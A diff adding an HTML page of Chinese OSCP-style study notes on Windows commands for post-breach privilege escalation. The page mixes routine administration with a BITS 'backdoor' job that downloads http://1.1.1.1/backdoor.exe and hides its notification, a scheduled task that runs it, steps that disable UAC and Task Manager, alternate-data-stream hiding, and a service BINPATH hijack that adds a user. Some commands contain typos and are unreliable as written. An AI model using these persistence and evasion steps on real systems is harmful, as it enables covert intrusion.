@@ -1,0 +1,495 @@
+<h1 id="windows命令">Windows命令<a aria-hidden="true" class="anchor-heading icon-link" href="#windows命令"></a></h1>
+<p>渗透测试过程中会，一旦突破边界，进入到一个系统中，就会遇到提权问题。此时我们就会用到Windowns系统命令。</p>
+<hr>
+<h1 id="重要的目录">重要的目录<a aria-hidden="true" class="anchor-heading icon-link" href="#重要的目录"></a></h1>
+<ul>
+<li>
+<p><code>AppDate\Roaming</code></p>
+<ul>
+<li><code>AppDate</code>目录是一个隐藏文件，位于 <code>C:\User\&#x3C;username></code> 下</li>
+<li><code>Roaming</code>目录是一个漫游目录，在域环境下，当用户通过不同终端登陆域内同一个用户时，会产生该目录。</li>
+<li>同步用户配置文件。</li>
+</ul>
+</li>
+<li>
+<p><code>C:\Windws</code></p>
+<blockquote>
+<p><code>C:\Windws</code> 有系统动态连接库，当软件需要的时候可以在动态连接库调用库文件，当进行AV绕过时会用到。</p>
+</blockquote>
+<ul>
+<li><code>System32</code> ：32位系统所有动态连接库文件都在此，如果64位系统，64位库文件会保存在此。</li>
+<li><code>System</code> ：64位系统中的32位动态连接库</li>
+<li><code>SysWOW64</code> ：64位系统运行32位应用程序时调用的动态连接库。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="系统信息查询">系统信息查询<a aria-hidden="true" class="anchor-heading icon-link" href="#系统信息查询"></a></h1>
+<h2 id="系统信息查询-1">系统信息查询<a aria-hidden="true" class="anchor-heading icon-link" href="#系统信息查询-1"></a></h2>
+<ul>
+<li>CMD命令行</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">systeminfo
+</code></pre>
+<p><code>systeminfo</code> 支持远程查看其他主机信息， 如果当前用户没有权限，可以指定有权限的用户。</p>
+<pre class="language-cmd"><code class="language-cmd">systeminfo /s  &#x3C;host1>  /U  domain\user  /P password
+</code></pre>
+<ul>
+<li>Powershell 命令行</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell"><span class="token function">get-Computerinfo</span>
+</code></pre>
+<hr>
+<h2 id="环境变量查询">环境变量查询<a aria-hidden="true" class="anchor-heading icon-link" href="#环境变量查询"></a></h2>
+<ul>
+<li>CMD 命令行</li>
+</ul>
+<p>查看默认环境变量</p>
+<pre class="language-cmd"><code class="language-cmd">set
+</code></pre>
+<blockquote>
+<p>USERNAME=user   # 调用用户名
+SystemRoot=C:\Windows  # 调用Windows目录
+PATHEXT=        # 指定默认可执行程序的扩展名
+Path=         # 指定环境变量</p>
+</blockquote>
+<h2 id="利用环境变量查询系统信息">利用环境变量查询系统信息<a aria-hidden="true" class="anchor-heading icon-link" href="#利用环境变量查询系统信息"></a></h2>
+<p>windows 可以利用环境变了查询系统信息，</p>
+<p>例：如果查询OS信息，就在 <code>%%</code> 中间写 <code>OS</code></p>
+<pre class="language-cmd"><code class="language-cmd">echo %OS%
+</code></pre>
+<p>例：如果查看临时目录信息，就在 <code>%%</code> 中间写 <code>TEMP</code></p>
+<pre class="language-cmd"><code class="language-cmd">echo %TEMP%
+</code></pre>
+<hr>
+<h2 id="利用第三方工具包查看系统信息">利用第三方工具包查看系统信息<a aria-hidden="true" class="anchor-heading icon-link" href="#利用第三方工具包查看系统信息"></a></h2>
+<p><code>SysinternalsSuite</code> 是微软合作伙伴开发的 <code>powershell</code>环境下的一个功能强大的工具包，可以用来查看系统信息。</p>
+<ul>
+<li>
+<p>使用方式：解压后，直接在该工具包目录下执行对应的程序。</p>
+</li>
+<li>
+<p>例：查看64位系统的系统信息</p>
+<p>在 <code>SysinternalsSuite</code>目录下执行以下命令</p>
+</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\PsInfo64<span class="token punctuation">.</span>exe
+</code></pre>
+<hr>
+<h1 id="powershell-取消图形画对话框">powershell 取消图形画对话框<a aria-hidden="true" class="anchor-heading icon-link" href="#powershell-取消图形画对话框"></a></h1>
+<p>只有命令行的时候，无法使用图形化界面点击确认，这时候就需要命令行取消图形对话框</p>
+<ul>
+<li>例：</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\accesschk64<span class="token punctuation">.</span>exe  <span class="token operator">/</span>accepteula
+</code></pre>
+<hr>
+<h1 id="文件基本操作">文件基本操作<a aria-hidden="true" class="anchor-heading icon-link" href="#文件基本操作"></a></h1>
+<h1 id="powershell">Powershell<a aria-hidden="true" class="anchor-heading icon-link" href="#powershell"></a></h1>
+<p>微软开发了powershell 中类linux命令，大部分命令是与linux保持一致的。</p>
+<ul>
+<li>跳转 ：<code>cd</code></li>
+<li>创建目录 ： <code>mkdir</code></li>
+<li>列出目录中文件： <code>ls</code></li>
+<li>查看文件内容： <code>type</code></li>
+<li>添加文件内容：<code>echo</code></li>
+<li>拷贝(复制) ：<code>copy</code></li>
+</ul>
+<hr>
+<h2 id="cmd-命令行常用">CMD 命令行常用<a aria-hidden="true" class="anchor-heading icon-link" href="#cmd-命令行常用"></a></h2>
+<ul>
+<li>改文件名：<code>rename</code></li>
+<li>创建目录 ： <code>mkdir</code></li>
+<li>移动文件 ：<code>move</code></li>
+<li>文件的比较： <code>fc</code></li>
+</ul>
+<ul>
+<li>type  ： 查看文件内容</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">type  local.txt
+</code></pre>
+<h3 id="列出目录内容">列出目录内容<a aria-hidden="true" class="anchor-heading icon-link" href="#列出目录内容"></a></h3>
+<ul>
+<li>dir  列出目录内容</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">dir    /s  *.exe
+</code></pre>
+<blockquote>
+<p>/a  参数的作用是列出隐藏文件</p>
+<p>/s  列出子目录</p>
+<p>也可以用通配符指定文件类型或文件名称</p>
+</blockquote>
+<ul>
+<li>列出目录树</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">tree  
+</code></pre>
+<blockquote>
+<p>tree  /f  # 不但列出目录也列出目录中的文件</p>
+</blockquote>
+<ul>
+<li>forfiles</li>
+</ul>
+<p><code>forfiles</code> 是一个windows中类似linux系统命令 <code>find</code> 的命令，但是目前来说还没有 <code>find</code>强大</p>
+<p>例： 在 <code>c:\windows</code>下找名为 <code>notepad.exe</code>的文件，并打印出它完整的路径 <code> echo @PATH</code></p>
+<pre class="language-cmd"><code class="language-cmd">forfiles /p  c:\windows  /s /m  notepad.exe  /c "cmd /c echo @PATH"
+</code></pre>
+<p>例：在 <code>c:\windows</code>下找到最后更改时间为2023年1月1日后修改的exe，并打印它的完整路径。</p>
+<pre class="language-cmd"><code class="language-cmd">forfiles /m *.exe /d 2023/1/1 /s  /p  c:\windwos  /c  "cmd  /c  echo  @path"
+</code></pre>
+<blockquote>
+<p>/p  # 指定起始目录</p>
+<p>/s  # 列出所以子目录</p>
+<p>/m  # 指定文件名</p>
+<p>/c  # 对前面的命令结果执行后面的命令
+/d  # 指定最后修改时间</p>
+</blockquote>
+<h3 id="创建连接快捷方式">创建连接（快捷方式）<a aria-hidden="true" class="anchor-heading icon-link" href="#创建连接快捷方式"></a></h3>
+<p>与linux 中一样，windows 也可以创建软、硬连接。</p>
+<ul>
+<li>创建软连接</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">mklink   link1   a.txt
+</code></pre>
+<ul>
+<li>创建硬连接</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">mklink  /h  link2  b.txt
+</code></pre>
+<hr>
+<h1 id="系统权限操作">系统权限操作<a aria-hidden="true" class="anchor-heading icon-link" href="#系统权限操作"></a></h1>
+<h2 id="查看用户账号">查看用户账号<a aria-hidden="true" class="anchor-heading icon-link" href="#查看用户账号"></a></h2>
+<ul>
+<li><code>whoami</code> ： 查看用户名</li>
+<li><code>whoami /user</code>  ： 查看用户SID</li>
+<li><code>net  user &#x3C;username></code>  : 查看用户信息，<strong>包括用户组</strong></li>
+</ul>
+<h2 id="查看内建账号">查看内建账号<a aria-hidden="true" class="anchor-heading icon-link" href="#查看内建账号"></a></h2>
+<pre class="language-cmd"><code class="language-cmd">wmic  sysaccount 
+</code></pre>
+<h2 id="添加账号">添加账号<a aria-hidden="true" class="anchor-heading icon-link" href="#添加账号"></a></h2>
+<p>想要添加账号，必须有administator权限，如何获取administrator权限详见 <a href="#uac">UAC</a>。</p>
+<pre class="language-cmd"><code class="language-cmd">net user sys  /add
+</code></pre>
+<h2 id="uac">UAC<a aria-hidden="true" class="anchor-heading icon-link" href="#uac"></a></h2>
+<p>UAC ：用户账号控制，当普通用户以管理员运行程序时，会弹出UAC窗口。</p>
+<blockquote>
+<p><img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691221541470.png" alt="1691221541470">  --------  <img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691221238234.png" alt="1691221238234"></p>
+</blockquote>
+<p>系统会给在administrator用户组中的非administrator用户，发两个身份令牌，一个是普通用户令牌，一个是administrator令牌。</p>
+<p>非administrator用户，即便在administrator用户组中，也不能获取最高权限（对系统级别进行操作），当想以管理员身份运行一个程序时，需要手动选择。</p>
+<ul>
+<li>查看用户权限</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell">whoami   <span class="token operator">/</span>grpups
+</code></pre>
+<blockquote>
+<p>Mandatory Lable : 强制标签</p>
+<p>当 <code>Mandatory Lable</code> 值为 <code>High</code>时，用户为高权限（拥有管理员权限）</p>
+<p>当 <code>Mandatory Lable</code> 值为 <code>Medium</code>时，用户为中等权限（管理员组中的非管理员用户）</p>
+</blockquote>
+<h3 id="禁用uac">禁用UAC<a aria-hidden="true" class="anchor-heading icon-link" href="#禁用uac"></a></h3>
+<p>可以从注册表禁用UAC,要想使之生效，在设置完成后需要重启系统。</p>
+<ul>
+<li>
+<p>单击“开始”，单击“运行”，键入 regedit，然后按 Enter。</p>
+</li>
+<li>
+<p>找到并单击下面的注册表子项</p>
+</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+</code></pre>
+<ul>
+<li><code>EnableLUA</code> 的值改为<code>'0'</code></li>
+<li>重启系统</li>
+</ul>
+<hr>
+<h2 id="以管理员权限运行某个程序">以管理员权限运行某个程序<a aria-hidden="true" class="anchor-heading icon-link" href="#以管理员权限运行某个程序"></a></h2>
+<p>RUNAS使用示例：</p>
+<blockquote>
+<p>搬运：<a href="https://blog.csdn.net/annita2019/article/details/113621931">https://blog.csdn.net/annita2019/article/details/113621931</a></p>
+</blockquote>
+<ul>
+<li>使用本机上的Administrator管理员身份执行CMD:</li>
+</ul>
+<p>/noprofile为不加载该用户的配置信息。</p>
+<pre class="language-cmd"><code class="language-cmd">runas /noprofile /user:mymachine\administrator cmd
+</code></pre>
+<ul>
+<li>使用本机上的admin身份扫行msc控制台。</li>
+</ul>
+<p>/profile为指定加载用户配置文件。 /env 表示使用当前环境。</p>
+<pre class="language-cmd"><code class="language-cmd">runas /profile /env /user:mydomain\admin “mmc %windir%\system32\dsa.msc”
+</code></pre>
+<ul>
+<li>使用域用户身份运行，并指定使用notepad打开my file.txt文档。</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">runas /env /user:user@domain.microsoft.com “notepad \”my file.txt\””
+</code></pre>
+<ul>
+<li>使用域管理员身份安装共享盘的软件
+<ul>
+<li>打开cmd
+<pre class="language-cmd"><code class="language-cmd">C:\Users\wuqy>runas /env /user:administrator@zhprny.com cmd   
+输入 administrator@zhprny.com 的密码:
+试图将 cmd 作为用户 "administrator@zhprny.com" 启动...
+</code></pre>
+</li>
+<li>使用域管理员身份给用户安装FileZilla_3.52.0.5_win64-setup.exe
+<pre class="language-mcd"><code class="language-mcd">C:\Users\wuqy>runas /env /user:administrator@zhprny.com \\192.168.1.51\netlogon\SOFT\FileZilla_3.52.0.5_win64-setup.exe
+输入 administrator@zhprny.com 的密码:
+试图将 \\192.168.1.51\netlogon\SOFT\FileZilla_3.52.0.5_win64-setup.exe 作为用户
+"administrator@zhprny.com" 启动...
+C:\Users\wuqy>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="实际应用实例">实际应用实例：<a aria-hidden="true" class="anchor-heading icon-link" href="#实际应用实例"></a></h3>
+<ul>
+<li>以管理员身份运行IE浏览器。</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">@echo off
+runas /user:Colin-PC\Administrator /sa “C:\Program Files\Internet Explorer\iexplore.exe”
+</code></pre>
+<p>将命令保存为批处理后，只要在用户电脑上运行这个批处理（第一次输入管理员密码），以后用户只要双击该文件就可会以管理员身份执行命令中所指定的程序了。</p>
+<ul>
+<li>将批处理文件封装为.exe的文件，让用户不能进行修改。</li>
+</ul>
+<p>下载一个“Bat To Exe Converter”程序：<a href="http://pan.baidu.com/s/1sjNM8Lf">http://pan.baidu.com/s/1sjNM8Lf</a></p>
+<p><img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691226413954.png" alt="1691226413954"></p>
+<hr>
+<h2 id="更改文件权限">更改文件权限<a aria-hidden="true" class="anchor-heading icon-link" href="#更改文件权限"></a></h2>
+<p>在windows系统中的ntfs文件系统中，一般一个子文件会自动继承父文件权限。
+在攻击过程中一般会在某个盘符或目录下创建一个目录或文件，禁止继承，这样来避免用户进行文件读取和操作。</p>
+<h3 id="命令行进行文件权限操作">命令行进行文件权限操作<a aria-hidden="true" class="anchor-heading icon-link" href="#命令行进行文件权限操作"></a></h3>
+<ul>
+<li>查看文件权限</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">icacls &#x3C;filename>
+</code></pre>
+<blockquote>
+<p>(I) : 表示此权限是继承权限</p>
+<p>(F) : 表示完全控制权限</p>
+</blockquote>
+<p><img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691222496771.png" alt="1691222496771"></p>
+<ul>
+<li>添加权限</li>
+</ul>
+<p>例：  为所有人添加完全控制权限</p>
+<pre class="language-cmd"><code class="language-cmd">icacls  &#x3C;filename>  /grant  everyone:f
+</code></pre>
+<p><img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691222528768.png" alt="1691222528768"></p>
+<hr>
+<h1 id="进程管理">进程管理<a aria-hidden="true" class="anchor-heading icon-link" href="#进程管理"></a></h1>
+<h2 id="进程查看">进程查看<a aria-hidden="true" class="anchor-heading icon-link" href="#进程查看"></a></h2>
+<pre class="language-cmd"><code class="language-cmd">tasklits
+</code></pre>
+<h2 id="杀死进程">杀死进程<a aria-hidden="true" class="anchor-heading icon-link" href="#杀死进程"></a></h2>
+<ul>
+<li>SysinternalsSuite 工具</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">pskill  PID
+</code></pre>
+<ul>
+<li>自带命令</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">taskkill  PID 
+</code></pre>
+<p>其他使用方式可以用 <code>taskkill  /？</code> 查询，结果如下图：
+<img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691223075455.png" alt="1691223075455"></p>
+<h2 id="查看进程加载的动态连接库">查看进程加载的动态连接库<a aria-hidden="true" class="anchor-heading icon-link" href="#查看进程加载的动态连接库"></a></h2>
+<ul>
+<li>不做筛选查看</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">Listdlls64.exe
+</code></pre>
+<ul>
+<li>查看没有签名的动态连接库</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">Listdlls64.exe  -u
+</code></pre>
+<blockquote>
+<p>没签名，<code>Verified</code> 参数的值为 <code>Unsigned</code></p>
+</blockquote>
+<p><img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691223392641.png" alt="1691223392641"></p>
+<hr>
+<h1 id="注册表">注册表<a aria-hidden="true" class="anchor-heading icon-link" href="#注册表"></a></h1>
+<p>图形界面运行<code>ragedit</code> 打开注册表编辑器。注册表由 <code>键-子键-值</code> 组成。</p>
+<p>windows 大多数系统配置和某些软件的配置信息，使用计算机过程中的的日志信息都会保存在注册表中。</p>
+<p>键 <code>HKEY_LOCAL_MACHINE</code> 下 <code>SAM</code> 、<code>SECURITY</code>、<code>SOFTWARE</code>、<code>SYSTEM</code> 这几各子键，对于的系统注册表数据库文件位置在<code>C:\System32\config</code> 下</p>
+<ul>
+<li>SAM 键 ：windows系统账户信息（普通用户想要看到，需要获取权限）。</li>
+</ul>
+<h2 id="命令行操作注册表">命令行操作注册表<a aria-hidden="true" class="anchor-heading icon-link" href="#命令行操作注册表"></a></h2>
+<ul>
+<li>查看键值</li>
+</ul>
+<p>查看当前用户下自启动程序</p>
+<pre class="language-cmd"><code class="language-cmd">reg  query hkcu\software\microsoft\windows\currentversion\run
+</code></pre>
+<p>查看整个系统层面的自启动程序</p>
+<pre class="language-cmd"><code class="language-cmd">reg  query hklm\software\microsoft\windows\currentversion\run
+</code></pre>
+<ul>
+<li>删除键值</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">reg delete  &#x3C;键值>
+</code></pre>
+<ul>
+<li>添加键值</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">reg   add  &#x3C;键值>
+</code></pre>
+<ul>
+<li>导出键值</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">reg  export
+</code></pre>
+<h3 id="例通过注册表添加键值来禁用任务管理器需要先获取管理员权限">例：通过注册表添加键值来禁用任务管理器(需要先获取管理员权限)<a aria-hidden="true" class="anchor-heading icon-link" href="#例通过注册表添加键值来禁用任务管理器需要先获取管理员权限"></a></h3>
+<pre class="language-cmd"><code class="language-cmd">reg  add "hkcu\software\microsoft\windows\currentversion\policies\system"  /v  disabletaskmgr /t  reg_dword /d "1"  /f
+</code></pre>
+<p><img src="/image/Security.OSCP.Windows%E5%91%BD%E4%BB%A4/1691226521926.png" alt="1691226521926"></p>
+<hr>
+<h1 id="bits-job">BITS Job<a aria-hidden="true" class="anchor-heading icon-link" href="#bits-job"></a></h1>
+<p>BITS 是一个系统的自动化任务的功能，用来进行远程数据传输，包括Update下载补丁也是通过BITS实现的。
+攻击者可以利用BITS 来建立自动化任务。</p>
+<pre class="language-powershell"><code class="language-powershell">
+bitsadmin  <span class="token operator">/</span>create  backdoor   
+<span class="token comment"># 创建自动化任务 </span>
+bitsadmin <span class="token operator">/</span>addfirel backdoor  <span class="token string">"http://1.1.1.1/backdoor.exe"</span>  <span class="token string">"c:\users\public\sshtool.exe"</span>  
+ <span class="token comment"># 添加任务内容</span>
+</code></pre>
+<h2 id="关闭系统提示">关闭系统提示<a aria-hidden="true" class="anchor-heading icon-link" href="#关闭系统提示"></a></h2>
+<p>一般当BITS Job 执行完后，会产生系统通知，攻击人员需要将通知关闭，避免运维人员发现</p>
+<pre class="language-powershell"><code class="language-powershell">bitsadmin  <span class="token operator">/</span>setnotifycmdline  backdoor <span class="token string">'c:\users\public\sshtool.exe'</span> <span class="token string">'NUL'</span> 
+</code></pre>
+<h2 id="设置周期执行">设置周期执行<a aria-hidden="true" class="anchor-heading icon-link" href="#设置周期执行"></a></h2>
+<p>下面命令的意思是：设置60分钟执行一次</p>
+<pre class="language-powershell"><code class="language-powershell">bitsadmin  <span class="token operator">/</span>setminretrydelay <span class="token string">"backdoor"</span>  60  
+</code></pre>
+<h2 id="启用-bits-job">启用 BITS Job<a aria-hidden="true" class="anchor-heading icon-link" href="#启用-bits-job"></a></h2>
+<p>设置完成后要将BITS Job 启用</p>
+<pre class="language-powershell"><code class="language-powershell">bitsadmin  <span class="token operator">/</span>resume backdoor
+</code></pre>
+<h2 id="查看-bits-job">查看 BITS Job<a aria-hidden="true" class="anchor-heading icon-link" href="#查看-bits-job"></a></h2>
+<ul>
+<li>查看BITS Job 列表</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell">bitsadmin  <span class="token operator">/</span>list
+</code></pre>
+<ul>
+<li>查看所有用户 BITS Job 详细信息</li>
+</ul>
+<pre class="language-poershell"><code class="language-poershell">bitsadmin /list  /alluser   /verbos
+</code></pre>
+<hr>
+<h1 id="计划任务">计划任务<a aria-hidden="true" class="anchor-heading icon-link" href="#计划任务"></a></h1>
+<ul>
+<li>查看计划任务</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell">schtasks
+</code></pre>
+<ul>
+<li>创建几乎任务</li>
+</ul>
+<pre class="language-powershell"><code class="language-powershell">schtasks  <span class="token operator">/</span>create  <span class="token operator">/</span><span class="token function">sc</span>    weekly   <span class="token operator">/</span>d mon  <span class="token operator">/</span>tn   backup  <span class="token operator">/</span>tr  c:\users\public\sshtool<span class="token punctuation">.</span>exe  <span class="token operator">/</span>st 2:00
+</code></pre>
+<blockquote>
+</blockquote>
+<blockquote>
+<p>/sc :  指定频率</p>
+<p>/d  ： 指定天（星期几）</p>
+<p>/tr :  指定执行命令</p>
+<p>/st  :指定时间</p>
+</blockquote>
+<hr>
+<h1 id="ads-可选数据流">ADS-可选数据流<a aria-hidden="true" class="anchor-heading icon-link" href="#ads-可选数据流"></a></h1>
+<p>windows 的ntfs系统文件系统中每个文件有一个默认数据流，除了默认数据流之外还可以绑定额外的数据流。 </p>
+<p>绑定额外数据流，可以隐藏额外数据流内容，这样直接查看文件内容就只能看到默认数据流的内容。例子如下：</p>
+<ul>
+<li>文件写入默认数据流</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">echo aaa > a.txt
+</code></pre>
+<ul>
+<li>文件写入额外数据流</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">echo bbb > a.txt:hide
+</code></pre>
+<ul>
+<li>查看文件（只能看到默认数据流）</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">type  a.txt
+</code></pre>
+<ul>
+<li>查看额外数据流</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">more  &#x3C; a.txt:hide
+</code></pre>
+<blockquote>
+<p>提示： 如果插入明显的恶意代码，有可能被windowsdefer杀掉</p>
+</blockquote>
+<h1 id="防火墙">防火墙<a aria-hidden="true" class="anchor-heading icon-link" href="#防火墙"></a></h1>
+<ul>
+<li>查看防火墙规则</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">netsh  advfirewall show allprofiles
+</code></pre>
+<ul>
+<li>添加防火墙规则</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">netsh advfirewall  firewall   add  rule  name="denyping" dir=in action=block protocol=icmpv4 remoteip=192.168.18.1
+</code></pre>
+<ul>
+<li>删除防火墙规则</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">netsh advfirewall  firewall delete ....
+</code></pre>
+<h1 id="服务控制">服务控制<a aria-hidden="true" class="anchor-heading icon-link" href="#服务控制"></a></h1>
+<ul>
+<li>查看进程对应的服务</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">tasklist /svc
+</code></pre>
+<ul>
+<li>启动服务</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">sc  start  &#x3C;服务名称>
+</code></pre>
+<ul>
+<li>停止服务</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">sc  stop  &#x3C;服务名称>
+</code></pre>
+<ul>
+<li>
+<p>简略查询服务状态</p>
+<p>该命令会显示当前服务是否启动及是否有权限停止</p>
+</li>
+</ul>
+<pre class="language-cmd"><code class="language-cmd">sc  qery  &#x3C;服务名>
+</code></pre>
+<blockquote>
+<p>STATE : 运行状态、是否有停止权限</p>
+<ul>
+<li>详细查询服务状态</li>
+</ul>
+</blockquote>
+<p> 该命令会显示当前服务调用什么命令</p>
+<pre class="language-cmd"><code class="language-cmd">sc  qc  &#x3C;服务名>
+</code></pre>
+<blockquote>
+<p>START_TYPE(启动类型) : AUTO_START(自动启动)  </p>
+<p>BINARY_PATH_NAME (启动时调用的命令) </p>
+<p>SERVICE_START_NAME（启动该服务的用户）：LocalSystem（本地system用户，系统最高权限） </p>
+</blockquote>
+<p>如果有完全控制的权限，就可以将该服务替换成我们想让它运行的程序(将名称改为此程序)</p>
+<ul>
+<li>修改服务启动时调用项</li>
+</ul>
+<p>如果有权限，修改此项后，该服务再次启动会调用修改后的命令</p>
+<pre class="language-cmd"><code class="language-cmd">sc config &#x3C;服务名> BINPATH="net user ww  /add"
+</code></pre>
